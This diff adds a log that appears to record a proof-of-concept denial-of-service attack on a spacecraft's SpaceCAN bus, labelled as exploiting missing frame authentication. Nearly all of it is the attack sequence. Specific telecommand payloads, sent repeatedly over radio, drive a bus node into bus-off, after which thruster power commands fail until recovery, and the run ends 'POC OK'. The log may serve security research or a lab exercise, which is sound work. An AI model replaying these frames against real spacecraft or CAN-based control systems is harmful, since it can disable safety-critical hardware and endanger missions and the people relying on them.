@@ -1,0 +1,86 @@
+[   0.000] ========================================================================
+[   0.000] V0-13 SpaceCAN bus-off DoS (no frame auth)
+[   0.000] ========================================================================
+[   0.000] --> TC apid=0x04 via=usb AES  payload=0000
+[   0.000] --> TC apid=0x0C via=usb AES  payload=-
+[   0.001] <-- TM apid=0x0C AES len=27
+[   0.001] --> TC apid=0x1C via=radio AES  payload=00000002840199
+[   0.002] <-- TM apid=0x1C clear len=8
+[   0.002] --> TC apid=0x1C via=radio AES  payload=00000002840199
+[   0.002] <-- TM apid=0x1C clear len=8
+[   0.002] --> TC apid=0x1C via=radio AES  payload=00000002840199
+[   0.002] <-- TM apid=0x1C clear len=8
+[   0.002] --> TC apid=0x1C via=radio AES  payload=00000002840199
+[   0.002] <-- TM apid=0x1C clear len=8
+[   0.002] --> TC apid=0x1C via=radio AES  payload=00000002840199
+[   0.003] <-- TM apid=0x1C clear len=8
+[   0.003] --> TC apid=0x1C via=radio AES  payload=00000002840199
+[   0.003] <-- TM apid=0x1C clear len=8
+[   0.003] --> TC apid=0x1C via=radio AES  payload=00000002840199
+[   0.003] <-- TM apid=0x1C clear len=8
+[   0.003] --> TC apid=0x1C via=radio AES  payload=00000002840199
+[   0.004] <-- TM apid=0x1C clear len=8
+[   0.004] --> TC apid=0x1C via=radio AES  payload=00000002840199
+[   0.004] <-- TM apid=0x1C clear len=8
+[   0.004] --> TC apid=0x1C via=radio AES  payload=00000002840199
+[   0.004] <-- TM apid=0x1C clear len=8
+[   0.004] --> TC apid=0x1C via=radio AES  payload=00000002840199
+[   0.004] <-- TM apid=0x1C clear len=8
+[   0.005] --> TC apid=0x1C via=radio AES  payload=00000002840199
+[   0.005] <-- TM apid=0x1C clear len=8
+[   0.005] --> TC apid=0x1C via=radio AES  payload=00000002840199
+[   0.005] <-- TM apid=0x1C clear len=8
+[   0.005] --> TC apid=0x1C via=radio AES  payload=00000002840199
+[   0.006] <-- TM apid=0x1C clear len=8
+[   0.006] --> TC apid=0x1C via=radio AES  payload=00000002840199
+[   0.006] <-- TM apid=0x1C clear len=8
+[   0.006] --> TC apid=0x1C via=radio AES  payload=00000002840199
+[   0.006] <-- TM apid=0x1C clear len=8
+[   0.006] --> TC apid=0x1C via=radio AES  payload=00000002840199
+[   0.007] <-- TM apid=0x1C clear len=8
+[   0.007] --> TC apid=0x1C via=radio AES  payload=00000002840199
+[   0.007] <-- TM apid=0x1C clear len=8
+[   0.007] --> TC apid=0x1C via=radio AES  payload=00000002840199
+[   0.007] <-- TM apid=0x1C clear len=8
+[   0.007] --> TC apid=0x1C via=radio AES  payload=00000002840199
+[   0.007] <-- TM apid=0x1C clear len=8
+[   0.007] --> TC apid=0x1C via=radio AES  payload=00000002840199
+[   0.008] <-- TM apid=0x1C clear len=8
+[   0.008] --> TC apid=0x1C via=radio AES  payload=00000002840199
+[   0.008] <-- TM apid=0x1C clear len=8
+[   0.008] --> TC apid=0x1C via=radio AES  payload=00000002840199
+[   0.008] <-- TM apid=0x1C clear len=8
+[   0.008] --> TC apid=0x1C via=radio AES  payload=00000002840199
+[   0.008] <-- TM apid=0x1C clear len=8
+[   0.008] --> TC apid=0x1C via=radio AES  payload=00000002840199
+[   0.009] <-- TM apid=0x1C clear len=8
+[   0.009] --> TC apid=0x1C via=radio AES  payload=00000002840199
+[   0.009] <-- TM apid=0x1C clear len=8
+[   0.009] --> TC apid=0x1C via=radio AES  payload=00000002840199
+[   0.009] <-- TM apid=0x1C clear len=8
+[   0.009] --> TC apid=0x1C via=radio AES  payload=00000002840199
+[   0.009] <-- TM apid=0x1C clear len=8
+[   0.009] --> TC apid=0x1C via=radio AES  payload=00000002840199
+[   0.009] <-- TM apid=0x1C clear len=8
+[   0.009] --> TC apid=0x1C via=radio AES  payload=00000002840199
+[   0.010] <-- TM apid=0x1C clear len=8
+[   0.010] --> TC apid=0x1C via=radio AES  payload=00000002840199
+[   0.010] <-- TM apid=0x1C clear len=8
+[   0.010] --> TC apid=0x1C via=radio AES  payload=00000002840199
+[   0.010] <-- TM apid=0x1C clear len=8
+[   0.010] --> TC apid=0x1C via=radio AES  payload=0000000284020164
+[   0.010] <-- TM apid=0x1C clear len=8
+[   0.010] busoff mask=0x01 err_count=256
+[   0.010] --> TC apid=0x0C via=usb AES  payload=-
+[   0.011] <-- TM apid=0x0C AES len=27
+[   0.011] thruster power after 'valid' frame while BUS-OFF: t0=0
+[   0.011] --> TC apid=0x1C via=radio AES  payload=030000028400
+[   0.011] <-- TM apid=0x1C clear len=8
+[   0.011] --> TC apid=0x1C via=radio AES  payload=0000000284020164
+[   0.012] <-- TM apid=0x1C clear len=8
+[   0.012] --> TC apid=0x0C via=usb AES  payload=-
+[   0.012] <-- TM apid=0x0C AES len=27
+[   0.012] thruster power after recovery: t0=100
+[   0.012] ========================================================================
+[   0.012] POC OK
+[   0.012] ========================================================================
